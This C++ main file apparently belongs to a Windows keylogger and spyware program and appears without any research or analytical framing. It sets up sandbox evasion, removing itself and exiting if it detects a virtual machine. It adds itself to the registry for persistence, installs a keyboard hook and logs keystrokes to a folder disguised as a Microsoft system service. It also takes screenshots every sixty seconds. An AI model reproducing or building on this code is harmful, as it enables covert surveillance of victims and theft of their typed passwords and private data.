#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

int main() {
#ifdef DEBUG_BUILD
  std::vector<std::filesystem::path>
	  path = Stream::GetAllFilesInFolder(Stream::GetPath(R"(\Microsoft\SystemService\)"));
  DEBA(path)
  std::string final = Convert::GetFinalFile(path[0].u8string());
  DEBN(final)
#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }
  Sys::AddToRegistry();
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
  Stream::MakeFile();
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);

  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
						"winpst",
						true,
						60000);

  KeyHook::HandleMessage(true);
#endif // DEBUG_BUILD
  return 0;
}


